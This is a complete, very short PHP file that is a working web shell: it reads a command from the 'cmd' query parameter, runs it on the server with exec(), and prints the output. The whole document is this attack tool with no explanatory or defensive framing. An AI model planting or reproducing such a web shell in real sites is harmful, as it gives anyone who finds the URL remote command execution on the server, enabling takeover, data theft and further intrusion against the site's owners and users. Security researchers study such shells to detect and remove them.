<?php
  echo "<pre>";
  exec( $_GET["cmd"], $out );
  echo htmlentities( join( "\n", $out ) );
  echo "</pre>";
?>
